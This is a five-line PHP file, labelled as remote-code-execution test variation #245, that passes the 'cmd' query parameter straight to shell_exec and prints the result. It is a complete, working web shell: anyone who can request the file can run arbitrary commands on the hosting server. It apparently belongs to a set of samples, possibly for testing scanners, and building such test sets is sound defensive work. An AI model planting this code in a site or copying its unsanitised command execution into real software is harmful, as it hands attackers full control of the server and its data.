<?php
// RCE test variation #245
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>